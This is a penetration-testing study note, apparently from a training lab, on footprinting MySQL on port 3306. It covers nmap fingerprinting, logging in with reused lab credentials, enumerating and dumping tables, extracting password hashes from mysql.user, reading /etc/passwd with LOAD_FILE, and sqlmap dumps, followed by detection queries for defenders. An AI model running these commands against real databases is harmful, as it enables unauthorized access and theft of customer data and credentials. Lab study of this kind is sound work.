# MySQL — Footprinting
**Port(s):** 3306 TCP
**Protocol:** TCP
**CPTS Module:** Footprinting | **Date:** March 2026

## What MySQL Is and Why Pentesters Care

MySQL is the world's most popular open-source relational database. An exposed port 3306 with weak or reused credentials gives direct access to all stored data — customer records, credentials, PII, and sometimes a path to OS-level command execution via the FILE privilege. What makes MySQL particularly dangerous is that credentials found on other services often work here too — credential reuse across services is extremely common in real environments.

Two tools cover MySQL enumeration: Nmap for fingerprinting the version, and the mysql client for interactive SQL enumeration once credentials are obtained.

## Enumeration — Step by Step

### Step 1 — Nmap Version Scan
```bash
sudo nmap -p3306 -sV 10.129.14.128
```
**What to look for:**
- Exact version string — feeds directly into CVE research
- Ubuntu/Debian build suffix reveals the underlying OS version for free

```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 8.0.27-0ubuntu0.20.04.1
```
The `0ubuntu0.20.04.1` suffix confirms Ubuntu 20.04 without needing `-O` OS detection.

### Step 2 — Connect With Credentials
```bash
mysql -u robin -probin -h 10.129.14.128
```
**Flag breakdown:**
- `-u robin` — MySQL username
- `-probin` — password with NO SPACE after `-p`
- `-h` — remote host IP

**The no-space rule is critical.** `-p robin` with a space makes MySQL prompt for a password interactively and treats `robin` as a database name. `-probin` with no space passes the password directly. This is one of the most common connection mistakes.

### Step 3 — Database Enumeration
```sql
-- List all databases
show databases;

-- Select target database
use customers;

-- List tables
show tables;

-- Inspect column structure before dumping data
describe myTable;
-- shorthand:
desc myTable;

-- Preview data
SELECT * FROM myTable LIMIT 5;

-- Targeted query
SELECT email FROM myTable WHERE name = "Otto Lang";
```

### Step 4 — High Value System Queries
```sql
-- MySQL user accounts and password hashes
SELECT user, host, authentication_string FROM mysql.user;

-- Current user privileges
SHOW GRANTS FOR 'robin'@'%';

-- Check FILE privilege (OS read/write)
SELECT @@datadir;          -- Database files location
SELECT @@hostname;         -- Server hostname
SELECT user();             -- Current logged-in user
SELECT @@version;          -- MySQL version

-- Read OS file (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');
```

### Step 5 — sqlmap Direct Connection
```bash
# Enumerate all databases
sqlmap -d "mysql://robin:robin@10.129.14.128:3306/" --dbs

# Dump specific table
sqlmap -d "mysql://robin:robin@10.129.14.128:3306/customers" -T myTable --dump
```

## Common Misconfigurations

| Misconfiguration | Why It Is Dangerous | Attack Path |
|---|---|---|
| Default or weak credentials | Direct database access | mysql client connects immediately |
| Credential reuse from other services | Same password works across multiple services | Try every credential found on any service against MySQL |
| FILE privilege granted | MySQL can read and write OS files | `SELECT LOAD_FILE('/etc/passwd')` reads system files |
| `root` accessible remotely | Full database control | Drop tables, create accounts, execute commands |
| Unencrypted PAN/CVV columns | Payment card data in plaintext | Instant critical finding in any pentest |
| `mysql` system DB accessible | Password hashes readable | Dump hashes for hashcat cracking |

## Real Lab Output
```
mysql -u robin -probin -h 10.129.14.128

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| customers          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+

MySQL [(none)]> use customers;
MySQL [customers]> show tables;
+---------------------+
| Tables_in_customers |
+---------------------+
| myTable             |
+---------------------+

MySQL [customers]> describe myTable;
+-----------+--------------------+
| Field     | Type               |
+-----------+--------------------+
| id        | mediumint unsigned |
| name      | varchar(255)       |
| email     | varchar(255)       |
| pan       | varchar(255)       |
| cvv       | varchar(255)       |
+-----------+--------------------+

MySQL [customers]> SELECT email FROM myTable WHERE name = "Otto Lang";
+---------------------+
| email               |
+---------------------+
| ultrices@google.htb |
+---------------------+
```

## What I Learned / What Surprised Me

The `pan` and `cvv` columns appearing in a customer table was something I did not expect to find — raw unencrypted payment card data sitting in a plaintext database column. In a real engagement that is an automatic critical finding regardless of how access was obtained. The no-space rule for the `-p` flag also caught me — it is the kind of thing that causes silent connection failures with no useful error message. The credential reuse angle was also reinforced here: `robin:robin` appeared on IMAP earlier in the module and worked again on MySQL, which is exactly how lateral movement works in real environments. Always try every credential you find against every open service.

## Detection Layer

| Log Source | What Is Logged | Detection Signal |
|---|---|---|
| MySQL general log | All queries executed | Bulk SELECT across all tables from single session |
| MySQL error log | Failed authentication attempts | Multiple auth failures from same IP |
| Network logs | Connection to port 3306 | External IP connecting directly to database port |
| SIEM | Auth events | Successful login followed by schema enumeration queries |

**SPL Query to detect MySQL enumeration:**
```spl
index=mysql sourcetype=mysql_logs
(query="show databases" OR query="show tables" OR query="information_schema")
| stats count by src_ip, user, query
| where count > 5
| sort -count
```

**KQL Query (Sentinel):**
```kql
CommonSecurityLog
| where DestinationPort == 3306
| where Message contains "show databases" or Message contains "information_schema"
| summarize Count=count() by SourceIP, DestinationIP
| sort by Count desc
```

**MITRE Technique:** T1213 — Data from Information Repositories
**Also relevant:** T1005 — Data from Local System (FILE privilege abuse)

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap -p3306 -sV <IP>` | Version fingerprint |
| `mysql -u <user> -p<pass> -h <IP>` | Connect (no space after -p) |
| `show databases;` | List all databases |
| `use <database>;` | Select database |
| `show tables;` | List tables |
| `describe <table>;` | Show column structure |
| `SELECT * FROM <table> LIMIT 5;` | Preview data |
| `SELECT user,authentication_string FROM mysql.user;` | Dump user hashes |
| `SELECT LOAD_FILE('/etc/passwd');` | Read OS file (FILE privilege) |
